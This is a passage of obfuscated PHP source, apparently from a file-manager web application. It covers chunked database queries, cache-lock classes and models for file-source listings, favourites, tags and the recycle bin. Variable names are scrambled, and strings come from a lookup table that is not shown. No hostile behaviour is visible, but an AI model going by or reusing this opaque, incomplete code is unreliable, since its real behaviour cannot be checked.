$§ìÑÀÒ; $†Å²±Î++; } else { $öéÕ÷Õó[$˜Üè‘Ä] = $§ìÑÀÒ; } } if ($‹Àšİ× && !$ŠÊÔğ·) { } return $öéÕ÷Õó; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ğ‰ãùö = array()) { $µ™¥× =& $_SERVER[¥Ÿ©ÒèÌ]; $ıú‘È“â = self::SQL_WHERE_IN_CHUNK; $Ç‘É¥Î‹ = $this->optionsValue(); $²²‹¾ùö = $this->findWhereField($Ç‘É¥Î‹); if (!$²²‹¾ùö || isset($Ç‘É¥Î‹[$µ™¥×[296]]) || isset($Ç‘É¥Î‹[$µ™¥×[357]])) { return parent::select($ğ‰ãùö); } $å×û—Û÷ = $Ç‘É¥Î‹[$µ™¥×[279]][$²²‹¾ùö][1]; $å×û—Û÷ = is_array($å×û—Û÷) ? $å×û—Û÷ : array(); $¼¯²Ñµ = null; for ($ÊñÍœÂ‡ = 0; $ÊñÍœÂ‡ < count($å×û—Û÷); $ÊñÍœÂ‡ += $ıú‘È“â) { $›ï£õÇ = array_slice($å×û—Û÷, $ÊñÍœÂ‡, $ıú‘È“â); if (!is_array($›ï£õÇ) || count($›ï£õÇ) == 0) { break; } $Ç‘É¥Î‹[$µ™¥×[279]][$²²‹¾ùö][1] = $›ï£õÇ; $this->optionsValue($Ç‘É¥Î‹); $ÆÕ§Ä×â = parent::select($ğ‰ãùö); if (!$ÆÕ§Ä×â) { continue; } $¼¯²Ñµ = is_array($¼¯²Ñµ) ? $¼¯²Ñµ : array(); $¼¯²Ñµ = array_merge($¼¯²Ñµ, $ÆÕ§Ä×â); } return $¼¯²Ñµ; } public function delete($´ç²Œî = array()) { $Û ò¿¼¹ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÇĞ•™èÙ = self::SQL_WHERE_IN_CHUNK; $æ»³ºó‡ = $this->optionsValue(); $Ò¬¥…ŒŸ = $this->findWhereField($æ»³ºó‡); if (!$Ò¬¥…ŒŸ) { return parent::delete($´ç²Œî); } $”†¿»²Ñ = 0; $ŠÆ„ÒıÑ = $æ»³ºó‡[$Û ò¿¼¹[279]][$Ò¬¥…ŒŸ][1]; $ŠÆ„ÒıÑ = is_array($ŠÆ„ÒıÑ) ? $ŠÆ„ÒıÑ : array(); for ($•¥ñ˜˜Ä = 0; $•¥ñ˜˜Ä < count($ŠÆ„ÒıÑ); $•¥ñ˜˜Ä += $ÇĞ•™èÙ) { $àÖôÅ±ò = array_slice($ŠÆ„ÒıÑ, $•¥ñ˜˜Ä, $ÇĞ•™èÙ); if (!is_array($àÖôÅ±ò) || count($àÖôÅ±ò) == 0) { break; } $æ»³ºó‡[$Û ò¿¼¹[279]][$Ò¬¥…ŒŸ][1] = $àÖôÅ±ò; $this->optionsValue($æ»³ºó‡); $”†¿»²Ñ += parent::delete($´ç²Œî); } return $”†¿»²Ñ; } private function findWhereField($„æÕ‰£Æ) { $è–ä°Ôë =& $_SERVER[¥Ÿ©ÒèÌ]; $Ü·æ‹ = self::SQL_WHERE_IN_CHUNK; if (!is_array($„æÕ‰£Æ) || !is_array($„æÕ‰£Æ[$è–ä°Ôë[279]])) { return !1; } foreach ($„æÕ‰£Æ[$è–ä°Ôë[279]] as $É¬È²¦Ó => $Ö”€“û²) { if (is_array($Ö”€“û²) && isset($Ö”€“û²[0]) && is_string($Ö”€“û²[0]) && strtolower($Ö”€“û²[0]) == $è–ä°Ôë[7] && is_array($Ö”€“û²[1]) && count($Ö”€“û²[1]) > $Ü·æ‹) { ignore_timeout(); return $É¬È²¦Ó; } } return !1; } public function setMasterDB($Â´›º¯Ø = true) { think_config($_SERVER[¥Ÿ©ÒèÌ][397], $Â´›º¯Ø); } } goto AƒÄÇ¡›å§; Cò†»”²é: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $øàĞ¹ÀÈ =& $_SERVER[¥Ÿ©ÒèÌ]; $°öšÏ¿ = $GLOBALS[$øàĞ¹ÀÈ[6]][$øàĞ¹ÀÈ[353]]; self::$cachePath = $°öšÏ¿[$øàĞ¹ÀÈ[192]][$øàĞ¹ÀÈ[78]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($îíõ½Êƒ, $ß§æ¸– = 0) { $­ıÑæ§­ =& $_SERVER[¥Ÿ©ÒèÌ]; $ù¾«“œ¸ = microtime(!0); $ù³Øäôµ = $ù¾«“œ¸ + $ß§æ¸– + 0.0001; $Ä®íı” = rtrim(self::$cachePath, $­ıÑæ§­[8]) . $­ıÑæ§­[849] . md5($îíõ½Êƒ) . $­ıÑæ§­[846]; if (file_exists($Ä®íı”) && filemtime($Ä®íı”) && filemtime($Ä®íı”) < time() - 10) { @unlink($Ä®íı”); } do { if (file_exists($Ä®íı”)) { cacheLockWait(); continue; } $Äøå¶ç = fopen($Ä®íı”, $­ıÑæ§­[850]); if (!$Äøå¶ç) { return !1; } $µÍœïø = flock($Äøå¶ç, LOCK_EX | LOCK_NB); self::$caches[$îíõ½Êƒ] = array($­ıÑæ§­[851] => $Äøå¶ç, $­ıÑæ§­[192] => $Ä®íı”); fwrite($Äøå¶ç, $ù³Øäôµ); clearstatcache(); if ($Äøå¶ç && $µÍœïø) { return !0; } cacheLockWait(); } while (microtime(!0) < $ù³Øäôµ); $this->unlock($îíõ½Êƒ); return !1; } public function lockGet($¶¿ò±æƒ) { $ÅÕ‡øƒ– =& $_SERVER[¥Ÿ©ÒèÌ]; $şıêÕÉ = rtrim(self::$cachePath, $ÅÕ‡øƒ–[8]) . $ÅÕ‡øƒ–[849] . md5($¶¿ò±æƒ) . $ÅÕ‡øƒ–[846]; return file_exists($şıêÕÉ); } public function unlock($Ø÷Àó²) { $åÅÅ¿Œ“ =& $_SERVER[¥Ÿ©ÒèÌ]; $íÁ¥”×ı = self::$caches[$Ø÷Àó²]; if (!$íÁ¥”×ı) { return; } @flock($íÁ¥”×ı[$åÅÅ¿Œ“[851]], LOCK_UN); @fclose($íÁ¥”×ı[$åÅÅ¿Œ“[851]]); @unlink($íÁ¥”×ı[$åÅÅ¿Œ“[192]]); unset(self::$caches[$Ø÷Àó²]); } } class CacheLockRedis { public function lock($›ş×ÂÂ±, $ŸÄÖ¨É° = 10) { $·Œ¿íé = Cache::init(); $ï¬§³ş = microtime(!0) + $ŸÄÖ¨É°; while (microtime(!0) < $ï¬§³ş) { $ÅíÎú¤ù = $·Œ¿íé->get($›ş×ÂÂ±); if (!$ÅíÎú¤ù) { $Ùï’ÇÈ = $·Œ¿íé->setLock($›ş×ÂÂ±, $ï¬§³ş, $ŸÄÖ¨É°); if ($Ùï’ÇÈ) { return !0; } } else { if ($ÅíÎú¤ù < microtime(!0)) { $·Œ¿íé->set($›ş×ÂÂ±, $ï¬§³ş, $ŸÄÖ¨É° * 2); if ($·Œ¿íé->get($›ş×ÂÂ±) === $ÅíÎú¤ù) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Ïèº¿•·) { return Cache::init()->get($Ïèº¿•·); } public function unlock($‰±ÓØ½Š) { return Cache::init()->remove($‰±ÓØ½Š); } } class CacheLockMemcached { public function lock($¼ô²‚Œ, $ƒà“üº = 0) { $çèİ‚¤Ğ = Cache::init(); $ø¼Éø× = microtime(!0) + $ƒà“üº; while (microtime(!0) < $ø¼Éø×) { $ğÑ½¼óÍ = $çèİ‚¤Ğ->get($¼ô²‚Œ); if (!$ğÑ½¼óÍ || $ğÑ½¼óÍ < microtime(!0)) { $½Ò¾Ÿµ­ = $çèİ‚¤Ğ->handle->add($¼ô²‚Œ, $ø¼Éø×, $ƒà“üº); if ($½Ò¾Ÿµ­) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¢Ä¨¡œÒ) { return Cache::init()->get($¢Ä¨¡œÒ); } public function unlock($üŠ¸ı¸æ) { return Cache::init()->remove($üŠ¸ı¸æ); } } goto bİÙÂ×Ûö; AƒÄÇ¡›å§: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\x74\145\x6d\117\160\164\x69\157\156"; public $field = array(); public function listData($¢ãÛ¥ëä = false, $ë¼´Œœ = "\155\x6f\x64\x69\x66\x79\x54\151\155\x65", $áÎôş¡ = false) { $İÕÑ’Ì¯ = Model($this->modelType)->get(!1, $this->optionType, !0); $‡ÛŸ¿Ÿ­ = array_values($İÕÑ’Ì¯); if ($‡ÛŸ¿Ÿ­ && $‡ÛŸ¿Ÿ­[0] && !is_array($‡ÛŸ¿Ÿ­[0])) { Model($this->modelType)->cacheRemove($this->optionType); $İÕÑ’Ì¯ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$İÕÑ’Ì¯) { return $¢ãÛ¥ëä ? null : array(); } if (!$¢ãÛ¥ëä) { $İÕÑ’Ì¯ = array_filter(array_values($İÕÑ’Ì¯)); return array_sort_by($İÕÑ’Ì¯, $ë¼´Œœ, $áÎôş¡); } return $İÕÑ’Ì¯[$_SERVER[¥Ÿ©ÒèÌ][398] . $¢ãÛ¥ëä]; } public function insert($µÕÑÄˆ×) { $®°‰ŸÇ¢ =& $_SERVER[¥Ÿ©ÒèÌ]; $µÕÑÄˆ× = array_field_key($µÕÑÄˆ×, $this->field); $ƒÃÉøÁú = Model($this->modelType)->get($®°‰ŸÇ¢[399], $this->optionType . $®°‰ŸÇ¢[400]); $ƒÃÉøÁú = $ƒÃÉøÁú ? $ƒÃÉøÁú : 0; $µÕÑÄˆ×[$®°‰ŸÇ¢[401]] = ++$ƒÃÉøÁú; $µÕÑÄˆ×[$®°‰ŸÇ¢[193]] = time(); $µÕÑÄˆ×[$®°‰ŸÇ¢[86]] = time(); Model($this->modelType)->set($®°‰ŸÇ¢[399], $ƒÃÉøÁú, $this->optionType . $®°‰ŸÇ¢[400]); Model($this->modelType)->set($®°‰ŸÇ¢[398] . $ƒÃÉøÁú, $µÕÑÄˆ×, $this->optionType); return $ƒÃÉøÁú; } public function update($Æ˜ŸÃâõ, $¾ØìÙœÌ) { $çÇœĞÕğ =& $_SERVER[¥Ÿ©ÒèÌ]; $¾ØìÙœÌ = array_field_key($¾ØìÙœÌ, $this->field); $òš“©Ö¹ = $this->listData($Æ˜ŸÃâõ); if (!$òš“©Ö¹ || !$Æ˜ŸÃâõ) { return !1; } $¾ØìÙœÌ = array_merge($òš“©Ö¹, $¾ØìÙœÌ); $¾ØìÙœÌ[$çÇœĞÕğ[86]] = time(); return Model($this->modelType)->set($çÇœĞÕğ[398] . $Æ˜ŸÃâõ, $¾ØìÙœÌ, $this->optionType); } public function remove($ò½óíŒ‹) { if (!$ò½óíŒ‹) { return !1; } return Model($this->modelType)->remove($_SERVER[¥Ÿ©ÒèÌ][398] . $ò½óíŒ‹, $this->optionType); } public function clear() { $İĞû¤àĞ =& $_SERVER[¥Ÿ©ÒèÌ]; Model($this->modelType)->remove($İĞû¤àĞ[399], $this->optionType . $İĞû¤àĞ[400]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($øå†“ÀÍ, $ÉØê¹úÒ) { if (!$ÉØê¹úÒ) { return !1; } $é¯Ûç = $this->listData(); $é¯Ûç = array_to_keyvalue($é¯Ûç, $øå†“ÀÍ); return isset($é¯Ûç[$ÉØê¹úÒ]) ? $é¯Ûç[$ÉØê¹úÒ] : !1; } public function findByName($Ä÷ËÀ­) { return $this->findByKey($_SERVER[¥Ÿ©ÒèÌ][32], $Ä÷ËÀ­); } protected function resetData($ÓõŸœÆ) { $¯ª±ñËŞ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÓõŸœÆ = is_array($ÓõŸœÆ) ? $ÓõŸœÆ : array(); $Ñ«üÆÁ¦ = array(); for ($Ø½ÈÚÃË = 0; $Ø½ÈÚÃË < count($ÓõŸœÆ); $Ø½ÈÚÃË++) { $Ñ«üÆÁ¦[$¯ª±ñËŞ[398] . $ÓõŸœÆ[$Ø½ÈÚÃË][$¯ª±ñËŞ[401]]] = $ÓõŸœÆ[$Ø½ÈÚÃË]; } return Model($this->modelType)->set($Ñ«üÆÁ¦, !1, $this->optionType); } private function getAutoName($É¸“—®÷) { $¢Ù…À™ = array_to_keyvalue($this->listData(), $_SERVER[¥Ÿ©ÒèÌ][32]); if (!$¢Ù…À™ || !isset($¢Ù…À™[$É¸“—®÷])) { return $É¸“—®÷; } for ($÷ ûÁ»Ğ = 1; $÷ ûÁ»Ğ < count($¢Ù…À™); $÷ ûÁ»Ğ++) { $¯Ú°™¿• = $É¸“—®÷ . "\x28{$÷ ûÁ»Ğ}\x29"; if (!isset($¢Ù…À™[$¯Ú°™¿•])) { return $¯Ú°™¿•; } } return $¯Ú°™¿•; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Òú‰©…è = false, $Ï‰½ï„ = '', $ äşëÉ¦ = false) { $ŒôıÙÚš =& $_SERVER[¥Ÿ©ÒèÌ]; $û‘¹¬î = $this->cacheGet($Ï‰½ï„); $£Ê»®ü˜ = $this->optionDefault($Ï‰½ï„); $£Ê»®ü˜ = is_array($£Ê»®ü˜) ? $£Ê»®ü˜ : array(); if (is_array($û‘¹¬î)) { $û‘¹¬î = array_merge($£Ê»®ü˜, $û‘¹¬î); return $Òú‰©…è ? isset($û‘¹¬î[$Òú‰©…è]) ? $û‘¹¬î[$Òú‰©…è] : null : $û‘¹¬î; } $ÏÚÒƒõ¥ = $this->filterWhere(array($ŒôıÙÚš[33] => $Ï‰½ï„)); $û‘¹¬î = $this->where($ÏÚÒƒõ¥)->select(); $û‘¹¬î = array_to_keyvalue($û‘¹¬î, $ŒôıÙÚš[95], $ŒôıÙÚš[378]); foreach ($û‘¹¬î as $œÎŸşÎ‰ => $©‚‡Å£Ö) { if ($ äşëÉ¦ || in_array($œÎŸşÎ‰, $this->jsonField)) { $û‘¹¬î[$œÎŸşÎ‰] = json_decode($©‚‡Å£Ö, !0); } } $this->cacheSet($Ï‰½ï„, $û‘¹¬î); $û‘¹¬î = array_merge($£Ê»®ü˜, $û‘¹¬î); return $Òú‰©…è ? $û‘¹¬î[$Òú‰©…è] : $û‘¹¬î; } public function set($£–÷¢î, $îä®õ– = false, $Ö…å•¼Ë = '') { $—èÆ½áû =& $_SERVER[¥Ÿ©ÒèÌ]; $this->cacheRemove($Ö…å•¼Ë); $æÌèÏ¾Ù = array(); $Ÿ¢‘«à´ = is_array($£–÷¢î) ? $£–÷¢î : array($£–÷¢î => $îä®õ–); foreach ($Ÿ¢‘«à´ as $Ì»¨úÅ => $¬İÚ ö¨) { if (is_array($¬İÚ ö¨)) { $¬İÚ ö¨ = json_encode_force($¬İÚ ö¨); } $this->checkLength($¬İÚ ö¨, !1, $this->tableName . $—èÆ½áû[4] . $£–÷¢î); $¬İÚ ö¨ = self::textEncode($¬İÚ ö¨); $Ÿ¢‘«à´ = array($—èÆ½áû[33] => $Ö…å•¼Ë, $—èÆ½áû[95] => $Ì»¨úÅ, $—èÆ½áû[378] => $¬İÚ ö¨); $æÌèÏ¾Ù[] = $this->filterWhere($Ÿ¢‘«à´); } if (!$æÌèÏ¾Ù) { return !0; } return $this->addAll($æÌèÏ¾Ù, array(), !0); } protected function optionDefault($ñüòŠ© = '') { return !1; } public function setDeep($œÇ£…Ç‹, $ãòÔ¾±Ğ = false, $Í–è«Ç = '') { $°±ñùıî = explode($_SERVER[¥Ÿ©ÒèÌ][10], $œÇ£…Ç‹); $ê¿†ÚØš = $this->get(); array_set_value($ê¿†ÚØš, $œÇ£…Ç‹, $ãòÔ¾±Ğ); $this->set($°±ñùıî[0], $ê¿†ÚØš[$°±ñùıî[0]], $Í–è«Ç); } public function remove($ê”ğÒÄ, $Ã«úıŒ = '') { $‰Â¢İ“ß =& $_SERVER[¥Ÿ©ÒèÌ]; $this->cacheRemove($Ã«úıŒ); $ö´¿İµå = $this->filterWhere(array($‰Â¢İ“ß[95] => $ê”ğÒÄ, $‰Â¢İ“ß[33] => $Ã«úıŒ)); if (is_null($ê”ğÒÄ)) { unset($ö´¿İµå[$‰Â¢İ“ß[95]]); } return $this->where($ö´¿İµå)->delete(); } public function cacheSet($¬‚™é…ù, $áÂŠ¶ü– = false) { return Cache::set($this->cacheKey($¬‚™é…ù), $áÂŠ¶ü–); } public function cacheGet($Ğ„²òÛÉ) { return Cache::get($this->cacheKey($Ğ„²òÛÉ)); } public function cacheRemove($©Òùñìú) { return Cache::remove($this->cacheKey($©Òùñìú)); } protected function filterWhere($Ï¶¨Ãû) { return $Ï¶¨Ãû; } protected function cacheKey($Æóò°) { return $Æóò°; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\x75\x72\x63\x65"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\141\155\x65" => "\151\x6f\x5f\163\x6f\x75\162\143\x65\x5f\x6d\145\164\141", "\x6d\145\164\141\x46\x69\x65\x6c\x64" => "\163\157\x75\x72\x63\x65\111\x44"); protected $dataAuto = array(array("\155\x6f\x64\x69\146\171\x54\x69\155\x65", "\164\x69\155\145", "\151\156\x73\145\162\x74", "\x66\165\156\143\164\x69\x6f\156"), array("\143\162\145\x61\x74\x65\124\151\155\x65", "\164\x69\x6d\145", "\x69\156\x73\x65\162\164", "\x66\165\x6e\143\164\151\x6f\156"), array("\x76\151\x65\x77\x54\x69\155\x65", "\164\151\155\x65", "\151\156\x73\x65\162\164", "\146\x75\x6e\143\x74\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Şä›‰”ë) { return $this->listSource(array($_SERVER[¥Ÿ©ÒèÌ][402] => $Şä›‰”ë)); } public function typeName($îÌşÉÑÕ) { static $úÌ¤›™‹ = array(self::TYPE_SYSTEM => "\x73\171\163\164\x65\155", self::TYPE_USER => "\165\x73\x65\162", self::TYPE_GROUP => "\147\162\157\x75\x70"); return $úÌ¤›™‹[$îÌşÉÑÕ . $_SERVER[¥Ÿ©ÒèÌ][12]]; } public function sourceListInfo($À“¹îÆ, $èŒÑ·»ù = false) { $ìâíùœ =& $_SERVER[¥Ÿ©ÒèÌ]; $À“¹îÆ = $À“¹îÆ ? $À“¹îÆ : array(); $À“¹îÆ = array_filter(array_unique($À“¹îÆ)); if (!$À“¹îÆ) { return array(); } $›–»àêÅ = $this->where(array($ìâíùœ[403] => array($ìâíùœ[7], $À“¹îÆ)))->select(); $this->_listDataApply($›–»àêÅ, $èŒÑ·»ù); return array_to_keyvalue($›–»àêÅ, $ìâíùœ[403]); } public function pathInfoFilter(&$Â„êºëş) { $ÄÃŸè¦„ =& $_SERVER[¥Ÿ©ÒèÌ]; static $ÚÉòÙŒ™ = false; static $øºìÇæÄ = false; static $ıÔÒ†©ù = false; if (!$ÚÉòÙŒ™) { $ô•·Æ± = $ÄÃŸè¦„[404]; $ô•·Æ± .= $ÄÃŸè¦„[405]; $ô•·Æ± .= $ÄÃŸè¦„[406]; $ƒïâïÄâ = $ÄÃŸè¦„[407]; $ÍÙ‚‡š = explode($ÄÃŸè¦„[50], $ƒïâïÄâ); $ÚÉòÙŒ™ = explode($ÄÃŸè¦„[50], $ô•·Æ±); $øºìÇæÄ = array(); foreach ($ÚÉòÙŒ™ as $íàÕŞËÉ) { if (in_array($íàÕŞËÉ, $ÍÙ‚‡š)) { continue; } $øºìÇæÄ[] = $íàÕŞËÉ; } $ıÔÒ†©ù = explode($ÄÃŸè¦„[50], $ÄÃŸè¦„[408]); } foreach ($ıÔÒ†©ù as $Ÿˆ£ˆ‚ù) { if (isset($Â„êºëş[$Ÿˆ£ˆ‚ù])) { $Â„êºëş[$Ÿˆ£ˆ‚ù] = intval($Â„êºëş[$Ÿˆ£ˆ‚ù]); } } $Â„êºëş[$ÄÃŸè¦„[78]] = $ÄÃŸè¦„[409] . $Â„êºëş[$ÄÃŸè¦„[403]] . $ÄÃŸè¦„[410]; $Â„êºëş[$ÄÃŸè¦„[33]] = $Â„êºëş[$ÄÃŸè¦„[411]] == 1 ? $ÄÃŸè¦„[79] : $ÄÃŸè¦„[192]; $Â„êºëş[$ÄÃŸè¦„[412]] = $this->typeName($Â„êºëş[$ÄÃŸè¦„[412]]); if ($Â„êºëş[$ÄÃŸè¦„[411]] != 1) { $Â„êºëş[$ÄÃŸè¦„[167]] = $Â„êºëş[$ÄÃŸè¦„[413]]; unset($Â„êºëş[$ÄÃŸè¦„[413]]); } $õ×àÔ…á = $ÚÉòÙŒ™; if (isset($Â„êºëş[$ÄÃŸè¦„[414]]) && $Â„êºëş[$ÄÃŸè¦„[414]][$ÄÃŸè¦„[415]] == -1) { $õ×àÔ…á = $øºìÇæÄ; } $Â„êºëş = array_field_key($Â„êºëş, $õ×àÔ…á); return $Â„êºëş; } public function listUserFav() { $Î‹¾›í° =& $_SERVER[¥Ÿ©ÒèÌ]; $¨ÖŸ¯Œ¸ = Model($Î‹¾›í°[416])->listData(); $Æì…º˜± = array_filter_by_field($¨ÖŸ¯Œ¸, $Î‹¾›í°[33], $Î‹¾›í°[417]); $Æì…º˜± = array_to_keyvalue($Æì…º˜±, $Î‹¾›í°[12], $Î‹¾›í°[78]); if ($Æì…º˜±) { $Æ¡æ–«› = $this->listSource(array($Î‹¾›í°[418] => array($Î‹¾›í°[419], $Æì…º˜±))); } $Æ¡æ–«› = array_to_keyvalue($Æ¡æ–«›[$Î‹¾›í°[373]], $Î‹¾›í°[403]); foreach ($¨ÖŸ¯Œ¸ as &$Ê¦ŞÛ±ó) { $Ê¦ŞÛ±ó = array($Î‹¾›í°[420] => $Ê¦ŞÛ±ó[$Î‹¾›í°[401]], $Î‹¾›í°[421] => $Ê¦ŞÛ±ó[$Î‹¾›í°[32]], $Î‹¾›í°[422] => $Ê¦ŞÛ±ó[$Î‹¾›í°[78]], $Î‹¾›í°[423] => $Ê¦ŞÛ±ó[$Î‹¾›í°[33]], $Î‹¾›í°[424] => $Ê¦ŞÛ±ó[$Î‹¾›í°[193]], $Î‹¾›í°[425] => $Ê¦ŞÛ±ó[$Î‹¾›í°[86]]); if ($Ê¦ŞÛ±ó[$Î‹¾›í°[33]] == $Î‹¾›í°[417] && $Æ¡æ–«›[$Ê¦ŞÛ±ó[$Î‹¾›í°[78]]]) { $Ê¦ŞÛ±ó[$Î‹¾›í°[87]] = $Æ¡æ–«›[$Ê¦ŞÛ±ó[$Î‹¾›í°[78]]]; } } unset($Ê¦ŞÛ±ó); return $¨ÖŸ¯Œ¸; } public function listUserTag($üÚ¼Á¡ğ) { $ıÎ‚€ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($üÚ¼Á¡ğ && !is_array($üÚ¼Á¡ğ)) { $üÚ¼Á¡ğ = array($üÚ¼Á¡ğ); } $ğÌÍš¦µ = Model($ıÎ‚€[426])->listData(); $ëçòÀ¦Ğ = array(); foreach ($ğÌÍš¦µ as $ğÛá¥‡) { $…µ–ÙÆ = $ğÛá¥‡[$ıÎ‚€[78]]; if (!$…µ–ÙÆ) { continue; } if (!isset($ëçòÀ¦Ğ[$…µ–ÙÆ])) { $ëçòÀ¦Ğ[$…µ–ÙÆ] = array(); } $ëçòÀ¦Ğ[$…µ–ÙÆ][] = $ğÛá¥‡[$ıÎ‚€[427]]; } $õ†«¢Ş¥ = array(); foreach ($ëçòÀ¦Ğ as $ñÖÔØ€ª => $Å£åõø–) { $¦†İœÄş = !0; if (!$üÚ¼Á¡ğ) { $õ†«¢Ş¥[] = $ñÖÔØ€ª; continue; } foreach ($üÚ¼Á¡ğ as $­¾‰§ñ) { if (!in_array($­¾‰§ñ, $Å£åõø–)) { $¦†İœÄş = !1; break; } } if ($¦†İœÄş) { $õ†«¢Ş¥[] = $ñÖÔØ€ª; } } if (!$õ†«¢Ş¥) { return array(); } $ıÕ’®¸¸ = $this->listSource(array($ıÎ‚€[418] => array($ıÎ‚€[419], $õ†«¢Ş¥))); if (!$ıÕ’®¸¸ || count($õ†«¢Ş¥) == $ıÕ’®¸¸[$ıÎ‚€[370]][$ıÎ‚€[371]]) { return $ıÕ’®¸¸; } $üĞõßÖø = array(); $âËİı€ô = array_to_keyvalue($ıÕ’®¸¸[$ıÎ‚€[77]], $ıÎ‚€[12], $ıÎ‚€[403]); $úäÄ¥Ïû = array_to_keyvalue($ıÕ’®¸¸[$ıÎ‚€[76]], $ıÎ‚€[12], $ıÎ‚€[403]); $¢ÜÙËò = array_merge($úäÄ¥Ïû, $âËİı€ô); foreach ($õ†«¢Ş¥ as $…µ–ÙÆ) { if (!in_array($…µ–ÙÆ, $¢ÜÙËò)) { $üĞõßÖø[] = $…µ–ÙÆ; } } if ($üĞõßÖø) { Model($ıÎ‚€[428])->removeBySource($üĞõßÖø); } return $ıÕ’®¸¸; } public function listUserRecycle() { $ßçìÊã± =& $_SERVER[¥Ÿ©ÒèÌ]; $Øˆ»ìáÒ = Model($ßçìÊã±[429])->listData(); if (!$Øˆ»ìáÒ) { return array(); } $ˆ»û÷ö¥ = array($ßçìÊã±[418] => array($ßçìÊã±[419], $Øˆ»ìáÒ), $ßçìÊã±[430] => 1); return $this->listSource($ˆ»û÷ö¥); } public function listSource($¢ÙüÜì‰, $²‹–À® = 3000) { $ª±¬ıö =& $_SERVER[¥Ÿ©ÒèÌ]; if (!isset($¢ÙüÜì‰[$ª±¬ıö[431]])) { $¢ÙüÜì‰[$ª±¬ıö[431]] = 0; } $­Æ¤Äöú = $ª±¬ıö[432]; $êú•ŠĞõ = $this->field($­Æ¤Äöú)->_makeOrder()->where($¢ÙüÜì‰)->selectPage($²‹–À®); $this->_listPageCheck($êú•ŠĞõ, $­Æ¤Äöú, $¢ÙüÜì‰); $this->_listDataApply($êú•ŠĞõ[$ª±¬ıö[373]]); $this->_listMake($êú•ŠĞõ); return $êú•ŠĞõ; } private function _listPageCheck(&$å˜Üı³, $çÅÌÙ©î, $‰—–Ò’Á) { $ï§éÁ„¥ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!is_array($å˜Üı³[$ï§éÁ„¥[370]])) { return; } $õ÷Ú¸û = $å˜Üı³[$ï§éÁ„¥[370]]; if ($õ÷Ú¸û[$ï§éÁ„¥[372]] <= 1) { return; } if ($õ÷Ú¸û[$ï§éÁ„¥[371]] >= 100000) { return; } if (Model($ï§éÁ„¥[433])->get($ï§éÁ„¥[434]) != $ï§éÁ„¥[435]) { return; } $çÅÌÙ©î = str_replace(array($ï§éÁ„¥[53], $ï§éÁ„¥[346], $ï§éÁ„¥[226]), $ï§éÁ„¥[12], $çÅÌÙ©î); $çÅÌÙ©î = $ï§éÁ„¥[436] . str_replace($ï§éÁ„¥[50], $ï§éÁ„¥[437], $çÅÌÙ©î) . $ï§éÁ„¥[438]; $‡ßóóÚõ = $ï§éÁ„¥[439]; $‡ßóóÚõ = $‡ßóóÚõ . $ï§éÁ„¥[440]; $ŸıœÎ¾µ = $õ÷Ú¸û[$ï§éÁ„¥[367]] * ($õ÷Ú¸û[$ï§éÁ„¥[357]] - 1) . $ï§éÁ„¥[50] . $õ÷Ú¸û[$ï§éÁ„¥[367]]; $Æ•ïµû„ = $this->_makeOrder(!0); $ˆ¦ãäıŸ = $ï§éÁ„¥[436] . str_replace($ï§éÁ„¥[50], $ï§éÁ„¥[437], $Æ•ïµû„[0]); if (strpos($ˆ¦ãäıŸ, $ï§éÁ„¥[441])) { $ˆ¦ãäıŸ = str_replace($ï§éÁ„¥[441], $ï§éÁ„¥[442], $ˆ¦ãäıŸ); } else { $ˆ¦ãäıŸ .= $ï§éÁ„¥[443] . $Æ•ïµû„[1]; } $ÓûÅµ Ñ = array(); foreach ($‰—–Ò’Á as $ë¿¢¡üá => $â™Õ©¨Œ) { $ÓûÅµ Ñ[$ï§éÁ„¥[436] . $ë¿¢¡üá] = $â™Õ©¨Œ; } $this->alias($ï§éÁ„¥[444])->field($çÅÌÙ©î)->limit($ŸıœÎ¾µ)->order($ˆ¦ãäıŸ); $¨çÎ™Ş± = $this->join($‡ßóóÚõ)->where($ÓûÅµ Ñ)->select(); if ($¨çÎ™Ş±) { $å˜Üı³[$ï§éÁ„¥[373]] = $¨çÎ™Ş±; } } protected function _makeOrder($ŠĞÆ¥¬Í = false) { $éìÙéôœ =& $_SERVER[¥Ÿ©ÒèÌ]; $¾Ùêé = Model($éìÙéôœ[445])->get($éìÙéôœ[446]); $ˆÓ«ìŞ˜ = Model($éìÙéôœ[445])->get($éìÙéôœ[447]); $‘›•×íŒ = array($éìÙéôœ[448] => $éìÙéôœ[449], $éìÙéôœ[450] => $éìÙéôœ[451]); $ä´‚æ…ê = array($éìÙéôœ[32] => $éìÙéôœ[32], $éìÙéôœ[80] => $éìÙéôœ[80], $éìÙéôœ[167] => $éìÙéôœ[413], $éìÙéôœ[452] => $éìÙéôœ[452], $éìÙéôœ[453] => $éìÙéôœ[454], $éìÙéôœ[193] => $éìÙéôœ[193], $éìÙéôœ[86] => $éìÙéôœ[86]); $–í’“£ = Input::get($éìÙéôœ[455], $éìÙéôœ[7], $¾Ùêé, array_keys($ä´‚æ…ê)); $ô¶…æß­ = Input::get($éìÙéôœ[456], $éìÙéôœ[7], $ˆÓ«ìŞ˜, array_keys($‘›•×íŒ)); if (!in_array($–í’“£, array_keys($ä´‚æ…ê))) { $–í’“£ = $éìÙéôœ[32]; } if (!in_array($ô¶…æß­, array_keys($‘›•×íŒ))) { $–í’“£ = $éìÙéôœ[448]; } if ($–í’“£ == $éìÙéôœ[32]) { } 